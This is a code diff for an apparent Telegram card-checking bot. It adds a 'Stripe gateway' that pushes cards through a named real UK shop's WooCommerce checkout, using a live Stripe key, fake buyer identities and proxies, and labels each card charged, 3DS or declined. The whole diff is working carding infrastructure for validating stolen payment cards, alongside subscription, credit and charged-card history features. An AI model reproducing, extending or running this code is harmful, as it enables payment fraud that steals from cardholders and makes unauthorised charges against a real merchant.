@@ -149,6 +149,17 @@ def init_database():
             END $$;
         """)
 
+        # gateway - card checking gateway (autoshopify, stripe)
+        cur.execute("""
+            DO $$
+            BEGIN
+                IF NOT EXISTS (SELECT 1 FROM information_schema.columns
+                               WHERE table_name='user_settings' AND column_name='gateway') THEN
+                    ALTER TABLE user_settings ADD COLUMN gateway TEXT DEFAULT 'autoshopify';
+                END IF;
+            END $$;
+        """)
+
         # Create card_history table for storing charged/3DS cards
         cur.execute("""
             CREATE TABLE IF NOT EXISTS card_history (
@@ -209,6 +220,7 @@ def get_default_settings() -> dict:
         "subscription_expires": None,
         "total_checks_used": 0,
         "last_credit_reset": None,
+        "gateway": "autoshopify",
     }
 
 def get_user_settings(user_id: int) -> dict:
@@ -221,7 +233,7 @@ def get_user_settings(user_id: int) -> dict:
             cur.execute(
                 """SELECT proxy, products, email, is_shippable,
                           credits, subscription_tier, subscription_expires,
-                          total_checks_used, last_credit_reset
+                          total_checks_used, last_credit_reset, gateway
                    FROM user_settings WHERE user_id = %s""",
                 (user_id,)
             )
@@ -240,6 +252,7 @@ def get_user_settings(user_id: int) -> dict:
                     "subscription_expires": row[6],
                     "total_checks_used": row[7] or 0,
                     "last_credit_reset": row[8],
+                    "gateway": row[9] or "autoshopify",
                 }
             else:
                 # Create new user settings with default credits
@@ -261,8 +274,8 @@ def save_user_settings(user_id: int, settings: dict) -> dict:
             cur.execute("""
                 INSERT INTO user_settings (user_id, proxy, products, email, is_shippable,
                                            credits, subscription_tier, subscription_expires,
-                                           total_checks_used, last_credit_reset, updated_at)
-                VALUES (%s, %s, %s, %s, %s, %s, %s, %s, %s, %s, CURRENT_TIMESTAMP)
+                                           total_checks_used, last_credit_reset, gateway, updated_at)
+                VALUES (%s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, CURRENT_TIMESTAMP)
                 ON CONFLICT (user_id) DO UPDATE SET
                     proxy = EXCLUDED.proxy,
                     products = EXCLUDED.products,
@@ -273,6 +286,7 @@ def save_user_settings(user_id: int, settings: dict) -> dict:
                     subscription_expires = EXCLUDED.subscription_expires,
                     total_checks_used = EXCLUDED.total_checks_used,
                     last_credit_reset = EXCLUDED.last_credit_reset,
+                    gateway = EXCLUDED.gateway,
                     updated_at = CURRENT_TIMESTAMP
             """, (
                 user_id,
@@ -285,6 +299,7 @@ def save_user_settings(user_id: int, settings: dict) -> dict:
                 settings.get("subscription_expires"),
                 settings.get("total_checks_used", 0),
                 settings.get("last_credit_reset"),
+                settings.get("gateway", "autoshopify"),
             ))
             conn.commit()
             cur.close()
@@ -1233,6 +1248,263 @@ async def auto_shopify_client(
 
 
 # =============================================================================
+# STRIPE GATEWAY - Based on sportaxracing.co.uk WooCommerce + Stripe
+# =============================================================================
+
+async def stripe_gateway_check(
+    card: str,
+    proxy: str = None,
+    max_retries: int = 3,
+    request_timeout: int = 30,
+    logger = None
+) -> dict:
+    """
+    Check card using Stripe gateway via sportaxracing.co.uk
+    Based on the SVB config flow.
+    """
+    import re
+
+    # Parse card
+    parts = card.replace("/", "|").replace(":", "|").split("|")
+    if len(parts) < 4:
+        return {"success": False, "error": "Invalid card format"}
+
+    cc_num = parts[0].strip()
+    cc_month = parts[1].strip().zfill(2)
+    cc_year = parts[2].strip()
+    cc_cvv = parts[3].strip()
+
+    # Ensure year is 4 digits
+    if len(cc_year) == 2:
+        cc_year = f"20{cc_year}"
+
+    # Generate random data
+    def random_string(length, chars="abcdefghijklmnopqrstuvwxyz"):
+        return ''.join(random.choice(chars) for _ in range(length))
+
+    def random_digits(length):
+        return ''.join(random.choice("0123456789") for _ in range(length))
+
+    email = f"{random_string(8)}@{random_string(4)}.{random_string(4)}"
+    first_name = random_string(8)
+    last_name = random_string(8)
+    address = f"street {random_digits(3)}"
+    phone = random_digits(10)
+    zipcode = f"90{random_digits(3)}"
+
+    # Headers
+    user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+
+    last_error = None
+    timeout = aiohttp.ClientTimeout(total=request_timeout)
+
+    # Setup proxy
+    proxy_url = None
+    if proxy:
+        is_valid, proxy_url, _ = parse_proxy_format(proxy)
+        if not is_valid:
+            proxy_url = None
+
+    connector = aiohttp.TCPConnector(ssl=False)
+
+    for attempt in range(1, max_retries + 1):
+        try:
+            jar = aiohttp.CookieJar()
+            async with aiohttp.ClientSession(timeout=timeout, cookie_jar=jar, connector=connector) as session:
+
+                # Step 1: Add to cart
+                add_cart_url = "https://sportaxracing.co.uk/shop/clutch-cover/e-start-gear-cover-screw-set/"
+                add_cart_data = aiohttp.FormData()
+                add_cart_data.add_field('quantity', '1')
+                add_cart_data.add_field('add-to-cart', '3695')
+
+                async with session.post(
+                    add_cart_url,
+                    data=add_cart_data,
+                    headers={"User-Agent": user_agent},
+                    proxy=proxy_url,
+                    allow_redirects=True
+                ) as resp:
+                    if resp.status not in [200, 302]:
+                        last_error = {"success": False, "error": f"Failed to add to cart (HTTP {resp.status})"}
+                        continue
+
+                # Step 2: Get checkout page for nonce
+                checkout_url = "https://sportaxracing.co.uk/checkout/"
+                async with session.get(
+                    checkout_url,
+                    headers={"User-Agent": user_agent},
+                    proxy=proxy_url
+                ) as resp:
+                    if resp.status != 200:
+                        last_error = {"success": False, "error": f"Failed to load checkout (HTTP {resp.status})"}
+                        continue
+                    checkout_html = await resp.text()
+
+                # Parse nonce
+                nonce_match = re.search(r'woocommerce-process-checkout-nonce"\s+value="([^"]+)"', checkout_html)
+                if not nonce_match:
+                    last_error = {"success": False, "error": "Failed to get checkout nonce"}
+                    continue
+                pay_nonce = nonce_match.group(1)
+
+                # Step 3: Create Stripe source
+                stripe_url = "https://api.stripe.com/v1/sources"
+                stripe_data = {
+                    "referrer": "https://sportaxracing.co.uk",
+                    "type": "card",
+                    "owner[name]": f"{first_name} {last_name}",
+                    "owner[address][line1]": address,
+                    "owner[address][city]": "beverly",
+                    "owner[address][postal_code]": "hg1 1aa",
+                    "owner[address][country]": "GB",
+                    "owner[email]": email,
+                    "owner[phone]": phone,
+                    "card[number]": cc_num,
+                    "card[cvc]": cc_cvv,
+                    "card[exp_month]": cc_month,
+                    "card[exp_year]": cc_year,
+                    "guid": "NA",
+                    "muid": "NA",
+                    "sid": "NA",
+                    "pasted_fields": "number",
+                    "payment_user_agent": "stripe.js/be0b733d77; stripe-js-v3/be0b733d77; card-element",
+                    "time_on_page": "69115",
+                    "key": "pk_live_mlOwgQvhxcwj7kkNivSHZ5iy"
+                }
+
+                async with session.post(
+                    stripe_url,
+                    data=stripe_data,
+                    headers={
+                        "User-Agent": user_agent,
+                        "Content-Type": "application/x-www-form-urlencoded"
+                    },
+                    proxy=proxy_url
+                ) as resp:
+                    stripe_result = await resp.json()
+
+                    if "error" in stripe_result:
+                        error_msg = stripe_result.get("error", {}).get("message", "Stripe error")
+                        return {
+                            "success": False,
+                            "error": error_msg,
+                            "gateway_message": error_msg,
+                            "status": "declined"
+                        }
+
+                    source_id = stripe_result.get("id")
+                    if not source_id:
+                        last_error = {"success": False, "error": "Failed to create Stripe source"}
+                        continue
+
+                # Step 4: Submit checkout
+                checkout_submit_url = "https://sportaxracing.co.uk/?wc-ajax=checkout"
+                checkout_data = {
+                    "billing_first_name": first_name,
+                    "billing_last_name": last_name,
+                    "billing_company": "",
+                    "billing_country": "GB",
+                    "billing_address_1": address,
+                    "billing_address_2": "",
+                    "billing_city": "beverly",
+                    "billing_state": "",
+                    "billing_postcode": "hg1 1aa",
+                    "billing_phone": phone,
+                    "billing_email": email,
+                    "account_password": "",
+                    "shipping_first_name": "",
+                    "shipping_last_name": "",
+                    "shipping_company": "",
+                    "shipping_country": "GB",
+                    "shipping_address_1": "",
+                    "shipping_address_2": "",
+                    "shipping_city": "",
+                    "shipping_state": "",
+                    "shipping_postcode": "",
+                    "order_comments": "",
+                    "shipping_method[0]": "legacy_flat_rate",
+                    "payment_method": "stripe",
+                    "terms": "on",
+                    "terms-field": "1",
+                    "woocommerce-process-checkout-nonce": pay_nonce,
+                    "_wp_http_referer": "/?wc-ajax=update_order_review",
+                    "stripe_source": source_id
+                }
+
+                async with session.post(
+                    checkout_submit_url,
+                    data=checkout_data,
+                    headers={
+                        "User-Agent": user_agent,
+                        "Content-Type": "application/x-www-form-urlencoded"
+                    },
+                    proxy=proxy_url
+                ) as resp:
+                    result_text = await resp.text()
+
+                    try:
+                        result_json = json.loads(result_text)
+                    except:
+                        result_json = {}
+
+                    # Parse response
+                    result_status = result_json.get("result", "")
+
+                    # Extract error message from WooCommerce
+                    error_match = re.search(r'woocommerce-error[^>]*>.*?<li[^>]*>\s*(.+?)\s*</li>', result_text, re.DOTALL)
+                    woo_error = error_match.group(1).strip() if error_match else ""
+                    # Clean HTML tags
+                    woo_error = re.sub(r'<[^>]+>', '', woo_error).strip()
+
+                    # Check for 3DS
+                    if "wc_stripe_verify_intent" in result_text or "stripe_confirm" in result_text:
+                        return {
+                            "success": False,
+                            "error": "3DS Authentication Required",
+                            "message": "3D Secure verification needed",
+                            "gateway_message": woo_error or "3DS Required",
+                            "status": "3ds"
+                        }
+
+                    if result_status == "success":
+                        order_id_match = re.search(r'"order_id":(\d+)', result_text)
+                        order_id = order_id_match.group(1) if order_id_match else "Unknown"
+                        return {
+                            "success": True,
+                            "message": f"Payment successful! Order #{order_id}",
+                            "gateway_message": "Approved",
+                            "status": "charged",
+                            "order_id": order_id
+                        }
+                    else:
+                        return {
+                            "success": False,
+                            "error": woo_error or "Payment declined",
+                            "gateway_message": woo_error or "Declined",
+                            "status": "declined"
+                        }
+
+        except aiohttp.ClientError as e:
+            last_error = {"success": False, "error": f"Network error: {str(e)[:50]}"}
+            if logger:
+                logger.warning(f"[Stripe Attempt {attempt}/{max_retries}] ClientError: {e}")
+        except asyncio.TimeoutError:
+            last_error = {"success": False, "error": "Request timed out"}
+            if logger:
+                logger.warning(f"[Stripe Attempt {attempt}/{max_retries}] Timeout")
+        except Exception as e:
+            last_error = {"success": False, "error": f"Error: {str(e)[:50]}"}
+            if logger:
+                logger.warning(f"[Stripe Attempt {attempt}/{max_retries}] Error: {e}")
+
+        if attempt < max_retries:
+            await asyncio.sleep(0.5)
+
+    return last_error or {"success": False, "error": "All retries failed"}
+
+
+# =============================================================================
 # CONCURRENCY MANAGEMENT - Per-user + Global limits
 # =============================================================================
 
@@ -1333,13 +1605,16 @@ async def process_single_card(card: str, user_id: int = None, user_settings: dic
     else:
         settings = user_settings
 
-    # Check for products early (before acquiring semaphore)
+    # Get gateway setting
+    gateway = settings.get("gateway", "autoshopify")
+
+    # Check for products early (only required for autoshopify gateway)
     user_products = settings.get("products", [])
-    if not user_products:
+    if gateway == "autoshopify" and not user_products:
         return {
             "card": card,
             "product_url": None,
-            "response": {"error": "No product set. Use /addproduct first.", "success": False},
+            "response": {"error": "No product set. Use /addproduct first or switch to Stripe gateway.", "success": False},
             "bin_data": {}
         }
 
@@ -1357,9 +1632,7 @@ async def process_single_card(card: str, user_id: int = None, user_settings: dic
     async with user_sem:
         async with global_semaphore:
             try:
-                logger.info(f'Processing card: {card} (user: {user_id})')
-
-                product_url = random.choice(user_products)
+                logger.info(f'Processing card: {card} (user: {user_id}, gateway: {gateway})')
 
                 # Use user's proxies or fall back to config
                 # Support both old format (string) and new format (list)
@@ -1373,23 +1646,37 @@ async def process_single_card(card: str, user_id: int = None, user_settings: dic
 
                 # Get a healthy proxy if available
                 healthy_proxy = await get_healthy_proxy(proxies) if proxies else None
-                active_proxies = [healthy_proxy] if healthy_proxy else proxies
 
-                response = await auto_shopify_client(
-                    card=card,
-                    product_url=product_url,
-                    email=settings.get("email") or config.DEFAULT_EMAIL,
-                    is_shippable=settings.get("is_shippable", config.IS_SHIPPABLE),
-                    proxies=active_proxies,
-                    logger=logger
-                )
+                product_url = None
 
-                # Check for invalid product error and auto-remove if detected
-                error_msg = response.get("error", "") if response else ""
-                if is_product_error(error_msg):
-                    asyncio.create_task(remove_invalid_product(user_id, product_url, error_msg, bot))
-                    response["product_removed"] = True
-                    response["error"] = f"⚠️ Product auto-removed: {error_msg}"
+                # Use appropriate gateway
+                if gateway == "stripe":
+                    # Stripe gateway - no product needed
+                    response = await stripe_gateway_check(
+                        card=card,
+                        proxy=healthy_proxy,
+                        logger=logger
+                    )
+                else:
+                    # Auto Shopify gateway (default)
+                    product_url = random.choice(user_products)
+                    active_proxies = [healthy_proxy] if healthy_proxy else proxies
+
+                    response = await auto_shopify_client(
+                        card=card,
+                        product_url=product_url,
+                        email=settings.get("email") or config.DEFAULT_EMAIL,
+                        is_shippable=settings.get("is_shippable", config.IS_SHIPPABLE),
+                        proxies=active_proxies,
+                        logger=logger
+                    )
+
+                    # Check for invalid product error and auto-remove if detected
+                    error_msg = response.get("error", "") if response else ""
+                    if is_product_error(error_msg):
+                        asyncio.create_task(remove_invalid_product(user_id, product_url, error_msg, bot))
+                        response["product_removed"] = True
+                        response["error"] = f"⚠️ Product auto-removed: {error_msg}"
 
                 # BIN lookup is fast and non-critical - run concurrently
                 bin_data = await bin_lookup(card[:6])
@@ -1398,7 +1685,8 @@ async def process_single_card(card: str, user_id: int = None, user_settings: dic
                     "card": card,
                     "product_url": product_url,
                     "response": response,
-                    "bin_data": bin_data
+                    "bin_data": bin_data,
+                    "gateway": gateway
                 }
 
             except asyncio.CancelledError:
@@ -1528,7 +1816,7 @@ def get_main_menu_keyboard(user_id: int = None):
         [InlineKeyboardButton("📦 Products", callback_data="menu_products")],
         [InlineKeyboardButton("🌐 Proxy", callback_data="menu_proxy")],
         [InlineKeyboardButton("⚙️ Settings", callback_data="menu_settings")],
-        [InlineKeyboardButton("💳 Check Cards", callback_data="menu_check_info")],
+        [InlineKeyboardButton("💳 Check Cards", callback_data="menu_gateway")],
         [
             InlineKeyboardButton("💰 Charged", callback_data="menu_charged_history"),
             InlineKeyboardButton("🔐 3DS", callback_data="menu_3ds_history")
@@ -1537,6 +1825,24 @@ def get_main_menu_keyboard(user_id: int = None):
     # Add admin panel button only for admins
     if user_id and is_admin(user_id):
         keyboard.append([InlineKeyboardButton("🔐 Admin Panel", callback_data="menu_admin")])
+    return InlineKeyboardMarkup(keyboard)
+
+
+def get_gateway_keyboard(user_id: int):
+    """Build gateway selection keyboard"""
+    settings = get_user_settings(user_id)
+    current_gateway = settings.get("gateway", "autoshopify")
+
+    # Show checkmark for current gateway
+    auto_mark = "✅ " if current_gateway == "autoshopify" else ""
+    stripe_mark = "✅ " if current_gateway == "stripe" else ""
+
+    keyboard = [
+        [InlineKeyboardButton(f"{auto_mark}🛒 Auto Shopify", callback_data="gw_autoshopify")],
+        [InlineKeyboardButton(f"{stripe_mark}💳 Stripe", callback_data="gw_stripe")],
+        [InlineKeyboardButton("ℹ️ How to Check Cards", callback_data="menu_check_info")],
+        [InlineKeyboardButton("◀️ Back", callback_data="menu_main")],
+    ]
     return InlineKeyboardMarkup(keyboard)
 
 def get_products_keyboard(user_id: int):
@@ -1970,10 +2276,55 @@ async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
             reply_markup=get_back_keyboard()
         )
 
+    # Gateway selection menu
+    elif data == "menu_gateway":
+        settings = get_user_settings(user_id)
+        current_gateway = settings.get("gateway", "autoshopify")
+        gateway_name = "Auto Shopify" if current_gateway == "autoshopify" else "Stripe"
+        await query.edit_message_text(
+            "💳 *Card Checking Gateway*\n\n"
+            f"*Current Gateway:* {gateway_name}\n\n"
+            "🛒 *Auto Shopify* \\- Uses external API with your products\n"
+            "💳 *Stripe* \\- Direct Stripe gateway \\(no product needed\\)\n\n"
+            "Select a gateway below:",
+            parse_mode="MarkdownV2",
+            reply_markup=get_gateway_keyboard(user_id)
+        )
+
+    # Gateway selection - Auto Shopify
+    elif data == "gw_autoshopify":
+        settings = get_user_settings(user_id)
+        settings["gateway"] = "autoshopify"
+        save_user_settings(user_id, settings)
+        await query.edit_message_text(
+            "✅ *Gateway Changed: Auto Shopify*\n\n"
+            "🛒 Cards will be checked using your configured products\\.\n\n"
+            "Make sure you have at least one product set\\!",
+            parse_mode="MarkdownV2",
+            reply_markup=get_gateway_keyboard(user_id)
+        )
+
+    # Gateway selection - Stripe
+    elif data == "gw_stripe":
+        settings = get_user_settings(user_id)
+        settings["gateway"] = "stripe"
+        save_user_settings(user_id, settings)
+        await query.edit_message_text(
+            "✅ *Gateway Changed: Stripe*\n\n"
+            "💳 Cards will be checked directly via Stripe gateway\\.\n\n"
+            "No product URL required\\!",
+            parse_mode="MarkdownV2",
+            reply_markup=get_gateway_keyboard(user_id)
+        )
+
     # Check cards info
     elif data == "menu_check_info":
+        settings = get_user_settings(user_id)
+        current_gateway = settings.get("gateway", "autoshopify")
+        gateway_name = "Auto Shopify" if current_gateway == "autoshopify" else "Stripe"
         await query.edit_message_text(
-            "💳 *Check Cards*\n\n"
+            f"💳 *Check Cards*\n\n"
+            f"*Current Gateway:* {gateway_name}\n\n"
             "*How to check cards:*\n\n"
             "1️⃣ Paste a card directly:\n"
             "`4111111111111111|12|2025|123`\n\n"
@@ -1984,7 +2335,7 @@ async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
             "• `card:mm:yyyy:cvv`\n"
             "• `card/mm/yyyy/cvv`",
             parse_mode="Markdown",
-            reply_markup=get_back_keyboard()
+            reply_markup=get_gateway_keyboard(user_id)
         )
 
     # Cancel input
